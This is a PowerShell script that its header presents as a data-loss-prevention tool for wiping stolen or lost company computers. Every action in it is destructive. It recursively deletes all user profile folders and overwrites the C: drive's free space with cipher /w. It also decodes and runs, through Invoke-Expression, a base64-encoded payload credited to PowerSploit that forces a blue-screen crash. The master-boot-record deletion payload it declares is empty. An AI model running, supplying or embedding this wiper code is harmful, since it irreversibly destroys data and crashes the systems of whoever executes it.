#####################################################################################################
#                                                                                                   #
#   ▄███████▄  ▄██████▄   ▄█     █▄     ▄████████    ▄████████    ▄█   ▄█▄  ▄█   ▄█        ▄█       #
#  ███    ███ ███    ███ ███     ███   ███    ███   ███    ███   ███ ▄███▀ ███  ███       ███       #
#  ███    ███ ███    ███ ███     ███   ███    █▀    ███    ███   ███▐██▀   ███▌ ███       ███       #
#  ███    ███ ███    ███ ███     ███  ▄███▄▄▄      ▄███▄▄▄▄██▀  ▄█████▀    ███▌ ███       ███       #
#▀█████████▀  ███    ███ ███     ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀▀█████▄    ███▌ ███       ███       #
#  ███        ███    ███ ███     ███   ███    █▄  ▀███████████   ███▐██▄   ███  ███       ███       #
#  ███        ███    ███ ███ ▄█▄ ███   ███    ███   ███    ███   ███ ▀███▄ ███  ███▌    ▄ ███▌    ▄ #
# ▄████▀       ▀██████▀   ▀███▀███▀    ██████████   ███    ███   ███   ▀█▀ █▀   █████▄▄██ █████▄▄██ #
#                                                   ███    ███   ▀              ▀         ▀         #
#####################################################################################################
# THIS IS A DLP TOOL THAT A COMPANY CAN USE TO WIPE THE DATA OFF A STOLEN/LOST COMPUTER             #
# USE THIS SCRIPT TO WIPE THE DATA OFF A COMPUTER AND THEN DELETE THE MASTER BOOT RECORD AND BSOD IT#
# TESTED ON WINDOWS 10                                                                              #
#####################################################################################################

# Delete User Data for each profile
function delete-profiledata{
$userprofiles = Get-ChildItem C:\users | Where-Object Name -CNotMatch "Public"
foreach($i in $userprofiles){
Start-Job -ScriptBlock { Remove-Item -Path $args[0] -Recurse -Force -ErrorAction SilentlyContinue } -ArgumentList ($i.FullName).ToString()
}
}

#Credit to PowerSploit For writing these fun modules
$DeleteMBR = @("")
$blueScreen = @("ZnVuY3Rpb24gU2V0LUNyaXRpY2FsUHJvY2Vzcwp7CjwjCi5TWU5PUFNJUwpDYXVzZXMgeW91ciBtYWNoaW5lIHRvIGJsdWUgc2NyZWVuIHVwb24gZXhpdGluZyBQb3dlclNoZWxsLgpQb3dlclNwbG9pdCBGdW5jdGlvbjogU2V0LUNyaXRpY2FsUHJvY2VzcwpBdXRob3I6IE1hdHRoZXcgR3JhZWJlciAoQG1hdHRpZmVzdGF0aW9uKQpMaWNlbnNlOiBCU0QgMy1DbGF1c2UKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBOb25lCk9wdGlvbmFsIERlcGVuZGVuY2llczogTm9uZQouUEFSQU1FVEVSIEV4aXRJbW1lZGlhdGVseQpJbW1lZGlhdGVseSBleGl0IFBvd2VyU2hlbGwgYWZ0ZXIgc3VjY2Vzc2Z1bGx5IG1hcmtpbmcgdGhlIHByb2Nlc3MgYXMgY3JpdGljYWwuCi5QQVJBTUVURVIgRm9yY2UKU2V0IHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2VzcyBhcyBjcml0aWNhbCB3aXRob3V0IGFza2luZyBmb3IgY29uZmlybWF0aW9uLgouRVhBTVBMRQpTZXQtQ3JpdGljYWxQcm9jZXNzCi5FWEFNUExFClNldC1Dcml0aWNhbFByb2Nlc3MgLUV4aXRJbW1lZGlhdGVseQouRVhBTVBMRQpTZXQtQ3JpdGljYWxQcm9jZXNzIC1Gb3JjZSAtVmVyYm9zZQojPgoKICAgIFtDbWRsZXRCaW5kaW5nKFN1cHBvcnRzU2hvdWxkUHJvY2VzcyA9ICRUcnVlLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZvcmNlLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRFeGl0SW1tZWRpYXRlbHkKICAgICkKCiAgICBpZiAoLW5vdCAoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IpKQogICAgewogICAgICAgIHRocm93ICdZb3UgbXVzdCBydW4gU2V0LUNyaXRpY2FsUHJvY2VzcyBmcm9tIGFuIGVsZXZhdGVkIFBvd2VyU2hlbGwgcHJvbXB0LicKICAgIH0KCiAgICAkUmVzcG9uc2UgPSAkVHJ1ZQoKICAgIGlmICghJEZvcmNlKQogICAgewogICAgICAgICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSgnSGF2ZSB5b3Ugc2F2ZWQgYWxsIHlvdXIgd29yaz8nLCAnVGhlIG1hY2hpbmUgd2lsbCBibHVlIHNjcmVlbiB3aGVuIHlvdSBleGl0IFBvd2VyU2hlbGwuJykKICAgIH0KICAgIAogICAgaWYgKCEkUmVzcG9uc2UpCiAgICB7CiAgICAgICAgcmV0dXJuCiAgICB9CgogICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ0JsdWVTY3JlZW4nKQogICAgJEFzc2VtYmx5QnVpbGRlciA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtSZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQogICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0JsdWVTY3JlZW4nLCAkRmFsc2UpCgogICAgIyBEZWZpbmUgW250ZGxsXTo6TnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uIG1ldGhvZAogICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnQmx1ZVNjcmVlbi5XaW4zMi5udGRsbCcsICdQdWJsaWMsIENsYXNzJykKICAgICRQSW52b2tlTWV0aG9kID0gJFR5cGVCdWlsZGVyLkRlZmluZVBJbnZva2VNZXRob2QoJ050U2V0SW5mb3JtYXRpb25Qcm9jZXNzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbnRkbGwuZGxsJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoW1JlZmxlY3Rpb24uTWV0aG9kQXR0cmlidXRlc10gJ1B1YmxpYywgU3RhdGljJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW1JlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0ludDMyXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbVHlwZVtdXSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbVUludDMyXSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNhbGxpbmdDb252ZW50aW9uXTo6V2luYXBpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XTo6QXV0bykKCiAgICAkbnRkbGwgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgogICAgJFByb2NIYW5kbGUgPSBbRGlhZ25vc3RpY3MuUHJvY2Vzc106OkdldEN1cnJlbnRQcm9jZXNzKCkuSGFuZGxlCiAgICAkUmV0dXJuUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKDQpCgogICAgJFByb2Nlc3NCcmVha09uVGVybWluYXRpb24gPSAyOQogICAgJFNpemVVSW50MzIgPSA0CgogICAgdHJ5CiAgICB7CiAgICAgICAgJG51bGwgPSAkbnRkbGw6Ok50U2V0SW5mb3JtYXRpb25Qcm9jZXNzKCRQcm9jSGFuZGxlLCAkUHJvY2Vzc0JyZWFrT25UZXJtaW5hdGlvbiwgW1JlZl0gJFJldHVyblB0ciwgJFNpemVVSW50MzIpCiAgICB9CiAgICBjYXRjaAogICAgewogICAgICAgIHJldHVybgogICAgfQoKICAgIFdyaXRlLVZlcmJvc2UgJ1Bvd2VyU2hlbGwgaXMgbm93IG1hcmtlZCBhcyBhIGNyaXRpY2FsIHByb2Nlc3MgYW5kIHdpbGwgYmx1ZSBzY3JlZW4gdGhlIG1hY2hpbmUgdXBvbiBleGl0aW5nIHRoZSBwcm9jZXNzLicKCiAgICBpZiAoJEV4aXRJbW1lZGlhdGVseSkKICAgIHsKICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRQSUQKICAgIH0KfQpTZXQtQ3JpdGljYWxQcm9jZXNzIC1Gb3JjZSAtRXhpdEltbWVkaWF0ZWx5")

# Executing
delete-profiledata
Invoke-Expression  ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($DeleteMBR)))
cipher /w:C:\
Invoke-Expression  ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($blueScreen)))